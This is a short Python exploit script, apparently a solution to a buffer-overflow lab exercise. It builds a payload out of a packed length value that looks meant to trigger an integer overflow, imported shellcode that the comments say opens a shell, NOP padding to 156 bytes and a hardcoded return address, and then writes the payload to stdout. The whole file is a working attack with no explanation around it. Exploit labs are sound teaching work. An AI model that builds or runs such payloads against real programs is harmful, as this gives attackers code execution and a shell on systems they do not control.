import sys
from struct import pack
from shellcode import shellcode
#53 bytes for shell
# Implement your attack here!
NOPs = (b"\x90" * (156 - len(shellcode)))
number = pack("<I", 0x4000001A)
returnadd = pack("<I", 0xfff68dd0)
# Launch the attack! 
payload = number + shellcode + NOPs + returnadd
sys.stdout.buffer.write(payload)
